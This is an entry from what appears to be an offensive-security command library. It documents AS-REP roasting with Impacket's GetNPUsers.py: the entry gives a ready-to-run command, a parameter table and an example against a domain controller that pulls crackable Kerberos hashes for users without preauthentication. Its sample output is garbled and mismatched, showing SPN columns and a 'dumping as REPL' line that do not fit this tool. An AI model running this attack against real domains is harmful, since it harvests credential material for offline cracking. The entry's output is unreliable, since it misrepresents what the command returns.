---
id: generated-1
name: getnpusers-brute-force-as-rep-users
type: command
executor: bash
data: >-
  GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS.txt -dc-ip $_TARGET_IP
  -request -format hashcat
output: >-
  Injecting and dumping as REPL, please wait...

  ServicePrincipalName  Name           MemberOf  PasswordLastSet            
  LastLogon  

  ---------------------  ----           --------  ----------------          
  --------  
              testspn1  user1          -          2019-01-01 00:00:00        2020-01-01 
  user1$krb5asrep$23$user1:challengehash...
created_at: '2020-03-17T21:43:18.756014+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - roasting
verified: true
validated: true
---

# getnpusers-brute-force-as-rep-users

## Command

```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS.txt -dc-ip $_TARGET_IP -request -format hashcat
```

## Description

Uses Impacket to request AS-REP TGTs for users without preauth, outputting crackable hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -no-pass | No password needed | Yes |
| -usersfile $_USERS.txt | Username list file | Yes |
| -dc-ip $_TARGET_IP | Domain controller IP | Yes |
| -request | Request TGTs | Yes |
| -format hashcat | Output for Hashcat | Yes |

## Examples

### Basic Usage

```bash
GetNPUsers.py example.com/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10 -request
```

## Expected Output

Hashes for valid users.

## Related

- [[procedures/Brute-Force-Users-without-Kerberos-Preauth]]
- [[tools/Impacket]]
